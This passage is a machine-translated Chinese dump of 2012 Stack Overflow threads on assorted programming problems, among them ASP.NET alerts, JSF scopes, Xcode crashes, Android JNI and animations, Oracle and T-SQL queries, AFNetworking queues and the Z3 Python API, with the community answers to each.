使用这两种解决方案，您的服务器将处理大量可能不需要的请求。您可以使用[PollJS](https://github.com/mtrpcic/polljs)（无耻的自我插件）之类的库来增加延迟，这将提高性能并减少带宽：

```
// Start a poller
Poll.start({
    name: "example_poller",
    interval: 1000,
    increment: 200,
    action: function(){
        $.ajax({}); // Your ajax here
    }
});

// If you want to stop it, just use the name
Poll.stop("example_poller"); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T13:56:27.487

`setTimeout()`如果你想减少对服务器的请求，你需要

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-08T13:59:16.337

如果您不想等待用户操作或 ajax 响应在一定时间后触发事件，则需要 setTimeout，否则您可能会等待 ajax 调用成功或错误事件。

# c# - 代码中的 C# Web 应用程序 javascript 警报

> ID：11866030
> 
> 赞同：0
> 
> 时间：2012-08-08T13:52:44.097
> 
> 标签：c#, asp.net, web-applications

我想在Web 应用程序中创建`Javascript`警报。`asp.net`但我无法创建这个。我在这里发布了我的部分代码，脚本管理器 javascript 警报未显示。请帮我显示javascript警报..

```
if (noofday > totalday)
{   

    // I want to display the confirm message box in this section   

    ScriptManager.RegisterStartupScript(this, this.GetType(), "script", "return confirm('Are you sure you want to delete');", true);
    if(true)
    {
        DataSet5TableAdapters.sp_inleaverequestTableAdapter TA = new DataSet5TableAdapters.sp_inleaverequestTableAdapter();
        TA.GetData(lbl_empcode.Text, lbl_empname.Text, lbl_dept.Text, txtfromdate.Text, txttodate.Text, Convert.ToString(noofday), ddlleavetype.SelectedItem.Text, Convert.ToString(totalday), txtreason.Text, ddlforward.SelectedItem.Text, " ", " ", " ", " ", lbl_date.Text);

        Send_Email(lbl_empcode.Text, lbl_empname.Text, txtfromdate.Text, txttodate.Text, noofday, ddlleavetype.SelectedItem.Text, txtreason.Text);
        clear();
        ScriptManager.RegisterStartupScript(this, this.GetType(), "temp", "<script language='javascript'>alert('Request sent successfully. Go and watch your status..');</script>", false);
    }
    else
    {   
        //DO Something
    }
}
else
{
    DataSet5TableAdapters.sp_inleaverequestTableAdapter TA = new DataSet5TableAdapters.sp_inleaverequestTableAdapter();
    TA.GetData(lbl_empcode.Text, lbl_empname.Text, lbl_dept.Text, txtfromdate.Text, txttodate.Text, Convert.ToString(noofday), ddlleavetype.SelectedItem.Text, Convert.ToString(totalday), txtreason.Text, ddlforward.SelectedItem.Text, " ", " ", " ", " ", lbl_date.Text);

    Send_Email(lbl_empcode.Text, lbl_empname.Text, txtfromdate.Text, txttodate.Text, noofday, ddlleavetype.SelectedItem.Text, txtreason.Text);

    ScriptManager.RegisterStartupScript(this, this.GetType(), "temp", "<script language='javascript'>alert('Request sent successfully. Go and watch your status..');</script>", false);
    clear();
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-09T16:25:41.060

我建议您首先尝试确定您期望的代码是否正在返回到页面。

有几种方法可以做到这一点，最简单的方法是在上面的代码运行后在页面上“查看源代码”。如果您能在页面中找到该内容，您将知道该内容正在返回到页面但未执行。

如果您在查看源代码时看不到内容，那么您遇到了不同的问题。要么控制被传递到另一个页面，要么它实际上并没有进入您期望的 if 条件。

一旦您了解了这两个部分的问题所在，您就可以开始查找可能导致问题的原因。

很明显，您可能并不完全了解 Web 的工作原理。鉴于这组代码....

```
 ScriptManager.RegisterStartupScript(this, this.GetType(), "script", "return confirm('Are you sure you want to delete');", true);
            if(true)
            {
                DataSet5TableAdapters.sp_inleaverequestTableAdapter TA = new DataSet5TableAdapters.sp_inleaverequestTableAdapter();
                TA.GetData(lbl_empcode.Text, lbl_empname.Text, lbl_dept.Text, txtfromdate.Text, txttodate.Text, Convert.ToString(noofday), ddlleavetype.SelectedItem.Text, Convert.ToString(totalday), txtreason.Text, ddlforward.SelectedItem.Text, " ", " ", " ", " ", lbl_date.Text);

                Send_Email(lbl_empcode.Text, lbl_empname.Text, txtfromdate.Text, txttodate.Text, noofday, ddlleavetype.SelectedItem.Text, txtreason.Text);
                clear();
                ScriptManager.RegisterStartupScript(this, this.GetType(), "temp", "<script language='javascript'>alert('Request sent successfully. Go and watch your status..');</script>", false);
            } 
```

...看来您希望服务器上的页面执行停止，然后等待客户端响应。这不是网页生命周期的工作方式。服务器代码将完全执行并将内容发送回客户端。它不像 Windows 窗体或控制台应用程序那样是一个交互式过程（即使使用 AJAX）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-28T19:45:26.833

AJAX 充其量是有问题的，特别是如果您像我们一样使用 VS 2003。使用 VS2008 或更新版本的 Dev Suite 可能会更好。所以我们切换到弹出窗口的模式对话框。它是使用 JavaScript 完成的。我们使用了一些旧开发网站上的 subModal 示例。迫不及待地想摆脱 VS2003 和 VB.Net。呸！

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-08-08T14:10:45.640

我建议你给你`Modal Pop`扩展器（`Ajax`工具）而不是使用`MessageBox`. 因为`asp.net`不包含`MessageBox`.

# jsf-2 - JSF 单控制器和不同的视图，编辑，更新页面

> ID：11866031
> 
> 赞同：0
> 
> 时间：2012-08-08T13:52:44.747
> 
> 标签：jsf-2, crud

我在 JSF 2.0 中这样做。我已经使用相同的控制器实现了添加和查看页面。我不知道使用相同的控制器是否是最佳做法，是吗？在[这个](https://stackoverflow.com/questions/3180400/recommended-jsf-2-0-crud-frameworks)例子中，它对所有添加、编辑、查看使用单个页面，但我有不同的页面。因此，当从查看页面迁移到编辑页面时，我想保留价值，但我不能。如何在同一控制器中的不同页面之间保留价值？输出控制台显示**编辑**值从**true**更改为**false**，我在**editLegendType**函数中将其更改为 true。

```
@ManagedBean
@ViewScoped
public class LegendController implements Serializable {

    LegendDTO legendDTO = new LegendDTO();
    String selectedLegend;
boolean edit;

public LegendController() {
      Logger.getLogger(LegendController.class.getName()).warning("The size of list" + edit);
    if (!edit) {
        legendDTO.getList().add(new Legend());
        Logger.getLogger(LegendController.class.getName()).warning("The size of list" + legendDTO.getList().size());
    }
}

//All function from here is to legend edit
public String editLegendType(LegendDTO dto) {
    edit = true;
    legendDTO = dto;
        Logger.getLogger(LegendController.class.getName()).warning("The size of list" + edit);
        return "addLegend";//from view page to addPage for edit.
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T13:59:51.873

恕我直言，对多个视图使用相同的控制器是可以的，如果它可以防止代码重复并且通过使用单独的视图来提高可用性。

不幸的是，您无法继续使用 View 范围。不过有几种选择。您可以使用新的自定义[**Conversation 范围**](https://stackoverflow.com/questions/7788430/how-does-jsf-2-conversationscope-work)，或者回退到**Session 范围**。两者都有优点和缺点 - 对于对话范围，您必须自己处理范围。使用 Session 范围，您可能会在会话中不必要地放入太多数据。

因此，如果我必须选择，我宁愿使用会话范围而不是会话范围作为更乏味但更干净的解决方案。

**编辑**：请注意，对话范围不是 JSF 功能，它来自 [**CDI**](http://docs.jboss.org/weld/reference/1.0.0/en-US/html/scopescontexts.html#d0e1734)，这意味着您必须将 bean 上的注释从 @ManagedBean 更改为 @Named

**EDIT2：**要在 tomcat 上使用 CDI，您需要将它放在类路径中。如果您使用的是 maven，请将其添加到您的`.pom`，其他范围内，“手动”下载并使用 jar。

```
<dependency>
  <groupId>org.jboss.weld.servlet</groupId>
   <artifactId>weld-servlet</artifactId>
   <version>1.1.9-Final</version>
</dependency> 
```

此外，您必须将其添加到您的`web.xml`：

```
<listener>
   <listener-class>
      org.jboss.weld.environment.servlet.Listener
   </listener-class>
</listener> 
```

您可能还需要一个[**空`beans.xml`**](http://relation.to/Bloggers/WhyIsBeansxmlRequiredInCDI)的. 不过我不确定。

# xcode - Xcode 4.4 不断崩溃

> ID：11866034
> 
> 赞同：1
> 
> 时间：2012-08-08T13:52:47.070
> 
> 标签：xcode

每次我在 Xcode 4.4 中打开我的应用程序时，它都会崩溃。它从来没有在 Lion 中这样做过，并且在大约 6 个月的工作后非常接近提交，至少可以说我很生气！如果有帮助，这是崩溃报告的一部分；我无法确定它的头或尾。如果有人能帮助我，我将永远欠你的债。

> 未捕获异常 (NSBadBitmapParametersException)：溢出分配位图后备存储。无法返回每行 1152921504606846976 字节、-9223372036854775808 高度和 1 个平面的位图。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T17:39:47.083

嗯，有这个问题我所做的是延迟xcode并重新下载它。希望有效！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-10T12:08:20.483

遇到此类问题，我得出以下结论：3个文件可能已损坏

1.  您的项目文件，在这种情况下，请尝试使用时间机器来获取可以使用的文件
2.  XCode 首选项：/Users/xample/Library/Preferences/com.apple.dt.Xcode.plist
3.  您项目的派生数据 ~/Library/Developer/Xcode/DerivedData

如果其中之一损坏，它将损坏另外 2 个。要恢复项目，请开始删除首选项和派生数据，然后尝试打开您的项目。重新安装 XCode 并没有解决我的问题，在我的情况下也没有使用 DP4.5。

但是：安装[最新的“Xcode 命令行工具”](http://adcdownload.apple.com/Developer_Tools/command_line_tools_os_x_mountain_lion_for_xcode__august_2012/command_line_tools_for_xcode_os_x_mountain_lion_aug_2012.dmg)解决了这个问题（这可能是首先要尝试的）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-14T16:12:59.007

恐怕这将作为错误报告提交给 Apple；他们从崩溃报告中说它看起来像一个错误。感谢大家的帮助。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-03T05:46:41.850

听起来很奇怪，但 Xcode 4.4 在打印大字符串日志时存在问题。我有同样的问题，我删除了一个打印大量文本的 NSLog，然后崩溃停止了......

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-18T17:11:59.100

对我来说，当我试图从项目视图中打开一个特定的 .storyboard 文件时，我遇到了这个崩溃。如果我直接通过finder打开文件，只要窗口很小，它就不会立即崩溃。如果我尝试调整它的大小或将其中一个视图滚动到视图中，它将再次崩溃。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-10-31T05:44:52.067

我在使用 XCode 4.5.1 时遇到了同样的问题。每当我打开情节提要时，它都会崩溃并引发以下错误：

应用程序特定信息：ProductBuildVersion：4G1004 未捕获异常 (NSBadBitmapParametersException)：溢出分配位图后备存储。无法返回每行 1152921504606846976 字节、-9223372036854775808 高度和 1 个平面的位图。

Apple 上周发布了 XCode 4.5.2 的新开发者预览版，它修复了我们在之前版本中看到的所有中间崩溃。此版本可在[https://developer.apple.com/devcenter/ios/index.action](https://developer.apple.com/devcenter/ios/index.action)

你可以试试这个。

# android - android apk中.so文件中的包名

> ID：11866036
> 
> 赞同：1
> 
> 时间：2012-08-08T13:52:51.540
> 
> 标签：android, java-native-interface, reverse-engineering

Android 可以通过 JNI 使用 .so 文件。C/C++ 中的本机函数绑定到 Java 函数。

我想使用其他开发人员的 .so 文件（我没有源代码）。我知道原生函数的接口，但我遇到了一些困难。似乎 .so 文件被硬编码为绑定某个包名称。

我有什么办法可以使用其他开发人员的 .so 文件吗？

如果没有，是否可以反编译 .so 文件并使其工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:36:18.293

您可以使用共享对象期望的名称创建一个包，其中您有一个包装类，其唯一目的是加载库并向使用此类的客户端提供本机方法。

将该包导入您自己的活动包（或任何您想使用它的地方）并通过包装类调用本机方法。

# asp.net - Gridview 中的可扩展和可折叠列

> ID：11866040
> 
> 赞同：-1
> 
> 时间：2012-08-08T13:52:55.883
> 
> 标签：asp.net, gridview

我在 asp.net 中使用 Gridview。列是这样的：四月，五月，六月，第一季度，七月，八月，九月，第二季度，十月，十一月，十二月，第三季度，一月，二月，三月，第四季度。我想如下显示gridview：

1.  最初只有列 Q1、Q2、Q3、Q4 应该是可见的。
2.  如果我点击 Q1，Apr，May，Jun 列应该是可见的。Q2、Q3、Q4 仍然可见。
3.  如果我点击 Q2，Oct，Nov，Dec 列应该是可见的。Q1、Q3、Q4 仍然可见。
4.  如果我点击 Q3，Oct、Nov、Dec 列应该是可见的。Q1、Q2、Q4 仍然可见。
5.  如果我点击 Q4，Jan,Feb,Mar 列应该是可见的。Q1、Q2、Q3 仍然可见。

再次单击任何展开的列应该像以前一样折叠它

有人指导我如何实现这一目标吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:13:49.350

使用 jQuery。将 CssClass 应用于表示的每个列。它不必是一个正常运行的 css 元素，只是一个名称。

```
<asp:BoundField ID="Apr" CssClass="Q1" .... /> 
```

然后，您可以为包含链接的 Q1 列使用标题模板。链接的单击事件应该调用一个 jQuery，该 jQuery 调用一个方法来切换`hide()`和`show()`匹配类中的元素。这将是一个功能想法：

```
function ToggleColumn(colID)
{
    var elements = $('.' + col);
    if (elements[0].is(":visible"))
    {
        elements.hide();
    } else {
        elements.show();
    }

    return false;
} 
```

调用它的链接是：

```
<asp:LinkButton ID="lnkQ1" OnClientClick="return ToggleColumn('Q1');" ... /> 
```

这显然需要根据您的特定要求进行调整，并且需要对可能发生故障的地方进行一些空检查。如果您将其视为伪代码，它应该会让您朝着正确的方向前进。

# jquery - 折叠和展开部分，图片未显示

> ID：11866049
> 
> 赞同：1
> 
> 时间：2012-08-08T13:53:29.207
> 
> 标签：jquery, html, css

您好，我有一张可能有很多行的表。我想通过在元素上添加折叠和展开部分来修改表格外观。所以我跟着[教程](http://programming4.us/mobile/3150.aspx)。

该演示位于[http://jsfiddle.net/zhshqzyc/3pajE/2/](http://jsfiddle.net/zhshqzyc/3pajE/2/)

我希望该图标位于文本“2012 年”的左侧，然后单击它。但是，图像根本不显示。

感谢您检查错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T13:57:53.513

添加`class="collapsible"`到您的表

这`$('table.collapsible tbody')`指的是具有**可折叠**类的表，因此该表应为：

```
<table id="myTable" width="560" border="1" cellspacing="2" cellpadding="2" class="collapsible"> 
```

# matlab - 格式化 fprintf

> ID：11866050
> 
> 赞同：1
> 
> 时间：2012-08-08T13:53:32.873
> 
> 标签：matlab, printf

我有一些 Matlab 代码，我正在尝试导出一些字符串并从中创建一个制表符分隔的文本文件。我认为 fprintf 在 C 中的表现类似（如果不是，请编辑我的标签）。我相信我的问题与我的格式字符串有关。基本上我有 7 个字符串，我想用制表符分隔，然后是换行符。请注意，“fid”是完整路径。我在 for 循环中循环这个，所以每次传递都会附加行并构建文件。

```
ImgData = strcat(ImgData, fid, '\t', imgNumber, '\t', N_std,'\t',S,'\t',N,'\t',SNR,'\t',SNR_dB,'\n');
DataOut = fopen(strcat('Image_F', folderNumber, '_Data.txt'), 'w');
fprintf(DataOut,'%s\t %s\t %s\t %s\t %s\t %s\t %s\n',ImgData); 
```

您可能会对它如何导出感到好奇。这种格式像

```
fid\tI#\tN_std\tS\tN\tSNR\tSNR_dB\n 
```

在 txt 文件中。如您所知，这不是制表符分隔的，这是我的主要问题。我在使用格式字符串时遇到了一些问题。有谁知道如何重新格式化它以打印标签和换行符？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T15:08:33.257

您正在创建一个字符串`ImgData`，然后将其作为输入传递给`fprintf`. 这会读`ImgData`入`%s`格式字符串的第一个，然后在末尾添加至少一个制表符。

你应该做的是写这样的东西：

```
`fprintf(DataOut,'%s\t%i\n',imgName,imgNumber)` 
```

假设它`imgName`是一个字符串和`imgNumber`一个整数。请注意，我将两个占位符（带有 % 符号）和两个输入变量传递给 fprintf。

使用`%6.2f`print 总共 6 个字符的浮点数，包括逗号后的 2 个字符，`SNR`例如 。

为了更容易开发，您可以将第一个输入参数放到`fprintf`，在这种情况下，它将打印到命令行。

# android - 在“隐藏”活动上做动画

> ID：11866051
> 
> 赞同：0
> 
> 时间：2012-08-08T13:53:35.873
> 
> 标签：android, android-activity, android-animation

我一直在努力让 Activity 在选择数据并准备好显示之前不显示：[Prevent screen display until after fetching data](https://stackoverflow.com/questions/11827480/prevent-screen-display-until-after-fetching-data)

终于在主题的帮助下让它工作了。

现在我有另一个问题。

我需要动画从一个活动到下一个活动的过渡。我知道如何使用 overridePendingTransition 但这在这里不起作用，因为当我想做动画时我已经在目标 Activity 中。我能看到另一个的唯一原因是因为当前的一个是透明的。

我滑入新的没有问题：

```
 View view = getLayoutInflater().inflate(R.layout.content_screen, null);
    view.startAnimation(AnimationUtils.loadAnimation(this, R.anim.slide_in_right));
    setContentView(view); 
```

但是，我想不出任何办法让旧的滑出。

有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T13:58:15.450

创建一个“向左滑出”动画。然后为新视图调整动画，因此当动画开始时，您将另一个动画应用并启动到另一个视图。例如，

```
Animation animation = AnimationUtils.loadAnimation(context,
            R.anim.slide_in_right);
    animation.setDuration(TIME);
    animation.setAnimationListener(new AnimationListener() {

        @Override
        public void onAnimationStart(Animation animation) {
                        // TODO - Set and start other animation here
        }

        @Override
        public void onAnimationRepeat(Animation animation) {

        }

        @Override
        public void onAnimationEnd(Animation animation) {

        }
    });

view.startAnimation(animation); 
```

[编辑]

```
 // First, define and infalte the view that will be incoming
 View upcomingView = inflater.inflate(...);

 // Next, we'll set the animation up
 Animation animation = AnimationUtils.loadAnimation(context,
        R.anim.slide_in_right);
animation.setDuration(TIME);
animation.setAnimationListener(new AnimationListener() {

    @Override
    public void onAnimationStart(Animation animation) {
        Animation outAnimation = AnimationUtils.loadAnimation(context,
        R.anim.slide_out_left);
        upcomingView.startAnimation(outAnimation);
    }

    @Override
    public void onAnimationRepeat(Animation animation) {

    }

    @Override
    public void onAnimationEnd(Animation animation) {

    }
});

currentView.startAnimation(animation); // This will start the animation defined above, which will also set and start the animation for the incoming object 
```

# sql - 我应该在 Oracle Partition By 子句中使用哪个字段来提高性能

> ID：11866052
> 
> 赞同：0
> 
> 时间：2012-08-08T13:53:35.647
> 
> 标签：sql, oracle, sql-update, database-partitioning

我有一个运行良好但需要很长时间才能完成的更新语句。

我在一个表中更新了大约 150 行，通过视图暴露了数万行。有人建议我使用 Partition By 子句来加快进程。

我对 Partition By 语句不太熟悉，但我一直在环顾四周，我想也许我需要使用一个具有可以比较的数值的字段。

它是否正确？或者我可以用其他东西对更大的表进行分区吗？

如果是这种情况，我正在为更大的表格中可以使用的东西而苦苦挣扎。该表的组成如下。

ID 的类型为 NUMBER，并为特定项目创建唯一 ID。Start_Date 具有日期类型，表示 ID 有效时的开始。结束日期具有日期类型，并指示 ID 不再有效的结束时间。ID_Type 是 NVARCHAR2(30) 并指示我们使用的标识符类型。ID_Type2 是 NVARCHAR2(30) 并指示我们正在使用的 Identifier 的 sub_type。标识符是 NVARCHAR2(30)，任何一个 ID 都可以映射到一个或多个标识符。

例如 - View_ID

```
ID | Start_Date | End_Date   | ID_Type1| ID_Type2 | Identifier
1  | 2012-01-01 | NULL       | Primary | Tertiary | xyz1
1  | 2012-01-01 | NULL       | Second  | Alpha    | abc2
2  | 2012-01-01 | 2012-01-31 | Primary | Tertiary | ghv2
2  | 2012-02-01 | NULL       | Second  | Alpha    | mno4 
```

只要有一个 id 按日期有效的子句，是否可以按此视图的 ID 字段进行分区？

尽管更新语句是根据几个可能的标识符和 ID_Type1 之一进行选择，但它是非常基本的。

```
UPDATE Temp_Table t set ID = 
(SELECT DISTINCT ID FROM View_ID v
 WHERE inDate BETWEEN Start_Date and End_Date
 AND v.Identifier = (NVL(t.ID1, NVL(t.ID2, t.ID3)))
 AND v.ID_Type1 in ('Primary','Secondary')); 
```

提前感谢您对我的问题的任何方面的任何建议。

***附加信息**************

 ****在调查并遵循 Gordon 的建议后，我将更新更改为三个更新。这将整个更新过程减少了 75%，从一分钟多一点减少到 20 多秒。这是一个很大的改进，但如果可能的话，我想进一步减少这个过程。

有人认为 Partition By 子句会更有帮助吗？如果是这样，将这个子句放入更新语句的正确方法是什么。老实说，我不确定我是否理解该条款的运作方式。

如果使用 SELECT 语句的 UPDATE 仅允许选择 1 个值，这是否会排除类似以下内容的内容？

```
UPDATE Temp_Table t SET t.ID = 
(SELECT DISTINCT ID,
        Row_Number () (OVER PARTITION BY ID_Type1) AS PT1
 FROM View_ID v
 WHERE inDate BETWEEN v.Start_Date and v.End_Date
 AND v.Identifier = t.ID1
 AND PT1.Row_Number = 1 ) 
```

*****解决方案* *** ** *** ** *** ********

 **我结合了以下两位响应者的建议，以显着提高性能。从 Gordon，我从我的 UPDATE 中删除了 NVL，并将其更改为三个单独的更新。（我更愿意将它们组合成一个案例，但我的试验仍然很慢。）

在 Eggi 中，我使用了某种物化视图，我实际上可以为自己编制索引并确定了 WITH 子句。

```
UPDATE Temp_Table t set ID = 
(WITH IDs AS (SELECT /*+ materialize */ DISTINCT ID, Identifier FROM View_ID v
 WHERE inDate BETWEEN Start_Date and End_Date
 AND v.Identifier = ID1)
 SELECT g.ID FROM IDs g
 WHERE g.Identifier = t.ID1; 
```

再次感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:19:08.100

分区的最佳选择似乎是开始日期，因为它似乎总是有一个值，并且您还可以在查询中将其作为输入参数。

如果您还没有这样做，我会在 ID_Type1 上添加位图索引。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:24:12.387

很难想象 Windows/分析功能将如何帮助此更新。我强烈建议你学习它们，但不是为了这个目的。

也许建议是对用于表的表空间进行分区。请注意，这与“partition by”语句*非常*不同，后者通常指的是窗口/分析函数。表空间分区可能有助于提高性能。但是，您可以尝试其他方法。

我认为您的问题是临时表和视图之间的连接。据推测，您正在创建临时表。您应该添加一个新列，例如 UsedID，其定义如下：

```
coalesce(t.ID1, t.ID2, t.ID3) as UsedId 
```

更新中的“WHERE”子句将是：

```
WHERE inDate BETWEEN Start_Date and End_Date AND
      v.Identifier = t.UsedId AND
      v.ID_Type1 in ('Primary', 'Secondary') 
```

我怀疑性能问题是在连接中使用了 NVL，这会干扰优化策略。

回应您的评论。. . 您的原始查询将与此版本有相同的问题。也许你想要的逻辑是：

```
WHERE inDate BETWEEN Start_Date and End_Date AND
      v.Identifier in (t.ID1, t.ID2, t.ID3) AND
      v.ID_Type1 in ('Primary', 'Secondary') 
```******

# css - 如何使 CSS3 动画在 IE7/8/9 中工作

> ID：11866053
> 
> 赞同：2
> 
> 时间：2012-08-08T13:53:38.387
> 
> 标签：css

我有一个关于[css3 动画](http://css-tricks.com/snippets/css/webkit-keyframe-animation-syntax/)的问题。我知道它在除 Internet Explorer (IE-7/8/9) 之外的所有浏览器中都能正常工作。我怎样才能让它在旧版本的 IE 中也能工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T13:57:08.427

您可能会发现有用[的 cssSandpaper——一个 CSS3 JavaScript 库](http://www.useragentman.com/blog/csssandpaper-a-css3-javascript-library/)。

# ios - AFNetworking：调度并发队列并在其中运行同步任务

> ID：11866057
> 
> 赞同：3
> 
> 时间：2012-08-08T13:53:46.857
> 
> 标签：ios, objective-c, concurrency, grand-central-dispatch, afnetworking

我`AFNetworking`正在开发的应用程序中使用。对于下载请求，我正在使用`AFHTTPRequestOperation`. `setCompletionBlockWithSuccess:failure`这将一个成功块和一个失败块与一个 联系起来`operation`，然后将该操作添加到一个`NSOperationQueue`using 中`addOperation`。

`AFNetworking`创建一个异步线程并在那里运行所有数据。但是，我想将三个操作添加到并发线程中，从而使它们同步运行。`serial queue`在 GCD 中也称为 a 。我怎样才能做到这一点`AFNetworking`？我是否应该创建自己的串行队列，然后`addOperation`在该队列中移动所有请求初始化、成功块、失败块并在串行队列下添加？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-08T14:21:18.690

将该`NSOperationQueue` `maxConcurrentOperationCount`属性设置为 1 会有效地创建一个串行队列。然后，您可以确保每个请求都将在触发下一个操作之前完成。

# iphone - 更改 UISegmentedControl 的布局？

> ID：11866059
> 
> 赞同：0
> 
> 时间：2012-08-08T13:53:52.583
> 
> 标签：iphone, objective-c, ios, uisegmentedcontrol

目前我正在使用 Sam Vermette 的 SVSegmentedControl - 效果很好，但我问自己是否可以更改 SVSegmentedControl 或 UISegmentedControl 的布局？

我想要 2 行和 2 个“单元”/行，这可能吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:01:56.850

如果你想有 2 行，每行有两个单元格，这不是你可以用默认的分段控制行为改变的事情。

如果你想要一个看起来像一个有 4 个部分的盒子并且表现得像一个分段控件（只允许选择一个部分），那么创建 2 个分段控件。`backgroundImageForState:barMetrics:`使用和其他类似方法自定义“它”（它们）的外观。当您检测到控件的某个部分已被选中时，请取消选择两个控件中的所有其他部分。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:00:04.660

如果您查看源代码，它实际上并没有从 UISegmentedControl 继承，而是从 UIControl 继承。因此，如果您不想自定义 UISegmentedControl，最好的办法是从头开始构建一个类似行为的控件。

# tsql - T-SQL VIEW - CTE + UNPIVOT 与 UNION 与其他技术

> ID：11866060
> 
> 赞同：3
> 
> 时间：2012-08-08T13:53:52.650
> 
> 标签：tsql, view, union, common-table-expression, unpivot

我想知道哪种解决方案更好。我必须在视图中声明一些变量，这些变量是使用 T-SQL 日期函数（DATEADD、DATEPART、GETDATE() 等）计算的。

经过一番研究，我写了这个：

```
WITH DatePeriods(ThisWeek,LastWeek,MonthToDate,QuarterToDate,YearToDate) AS
(
    SELECT  "...date functions..." AS ThisWeek
            "...date functions..." AS LastWeek
            "...date functions..." AS MonthToDate
            "...date functions..." AS QuarterToDate
            "...date functions..." AS YearToDate
)
SELECT Desciption,Value
FROM DatePeriods
UNPIVOT
(
    Value FOR Desciption IN (ThisWeek,LastWeek,MonthToDate,QuarterToDate,YearToDate)
) AS Source 
```

它看起来很酷，因为我有“cte”和“unpivot”。如果我想添加其他日期变量，我只应该在 CTE 的选择中插入。

另一种解决方案是使用普通的“联合”：

```
SELECT  'ThisWeek',"...date functions..." AS ThisWeek
UNION
SELECT  'LastWeek',"...date functions..." AS LastWeek
UNION
SELECT  'MonthToDate',"...date functions..." AS MonthToDate
UNION
SELECT  'QuarterToDate',"...date functions..." AS QuarterToDate
UNION
SELECT  'YearToDate',"...date functions..." AS YearToDate 
```

我认为这不太好，因为新的日期变量意味着新的联合，但毕竟只有少数变量之间的联合。

谁能告诉我在这种情况下哪种技术是好的做法，甚至提供其他解决方案？

提前致谢。

编辑：

这是我想要的输出：

```
Desciption      Value
ThisWeek        2012-08-05 08:55:23.013
LastWeek        2012-07-29 08:55:23.013
MonthToDate     2012-07-08 08:55:23.013
QuarterToDate   2012-05-08 08:55:23.013
YearToDate      2011-08-08 08:55:23.013 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-08T14:23:01.577

如果您查看查询计划，您会发现您的`union`版本比您的版本具有更高的成本`unpivot`。但是，如果您改为`union all`改为，它会比`unpivot`.

如果您使用的是 SQL Server 2008 或更高版本，则可以`values`改用，根据执行计划，成本与`union all`.

价值观版本：

```
select Description, Value
from (values ('ThisWeek',      getdate()+1),
             ('LastWeek',      getdate()+2),
             ('MonthToDate',   getdate()+3),
             ('QuarterToDate', getdate()+4),
             ('YearToDate',    getdate()+5)
     ) as T(Description, Value) 
```

联合所有版本：

```
SELECT  'ThisWeek' AS Description, getdate()+1 AS Value
UNION ALL
SELECT  'LastWeek', getdate()+2
UNION ALL
SELECT  'MonthToDate', getdate()+3 
UNION ALL
SELECT  'QuarterToDate', getdate()+4 
UNION ALL
SELECT  'YearToDate', getdate()+5 
```

的原因比它`union`慢`union all`是因为它试图从`union all`包含所有行的结果集中删除重复项，而不管值如何。

# asp.net - n 层架构：为多个服务使用 TransactionScope 或工作单元？

> ID：11866061
> 
> 赞同：0
> 
> 时间：2012-08-08T13:53:52.660
> 
> 标签：asp.net, entity-framework, repository, unit-of-work, n-layer

我目前正在研究具有以下几层的 n 层架构

*   查看（ASP.net Web 应用程序）
*   经理（编排服务）
*   服务（业务层使用工作单元）
*   存储库（数据访问）

目前，Manager 正在调用一项或多项服务来访问数据、保存数据或执行其他一些业务。服务正在使用已实现的工作单元和存储库，以便在事务中使用服务。

现在我们有一个需要调用不同服务的管理器，这些服务应该在一个事务中一起工作。

我的观点是，工作单元调用应该保留在服务中，因为服务正在使用存储库访问数据库。如果我们将 Unit of Work 调用移至 Manager，则会破坏设计。经理需要对存储库的引用。

任何建议如何设计访问？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:13:57.823

工作单元不是数据访问模式。它是逻辑事务的表示 = 它是业务逻辑的一部分，属于您的经理，因为经理正在编排来自多个服务的逻辑事务。

你的经理是一个门面（或者我们称之为顶级服务）——它仍然是业务逻辑，如果逻辑操作需要多个低级服务，它们应该都在单个工作单元中运行。

# python - 在 Z3 Python API 中使用布尔 If 重新初始化实变量

> ID：11866068
> 
> 赞同：0
> 
> 时间：2012-08-08T13:54:28.270
> 
> 标签：python, z3

我需要根据一些布尔标志重新初始化一个实变量，如下所示。除了改变`location_next`我想`x_next`用另一个值重新初始化的真值。我怎样才能做到这一点？

```
location, location_next = Bools('location location_next')
x, x_next = Reals('x x_next')
...
location_next == If(And(Not(location), x_next >= 12),
                    True,
                    If(And(location, x_next <= 0), False, location)) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:39:59.693

该函数`If`（在 Z3 API 中）也可用于创建非布尔表达式。我们必须为每个`If(c, t1, t2)`,`c`具有排序布尔值，`t1`并且`t2`具有相同的排序 (类型) `S`。在这种情况下，`If(c, t1, t2)`is 将生成 sort 的 Z3 表达式`S`。这是一个小例子：

```
x, y = Reals('x y')
print If(x > 0, x + 1, y - 1) 
```

这是上面示例的链接：[http ://rise4fun.com/Z3Py/V4e](http://rise4fun.com/Z3Py/V4e)

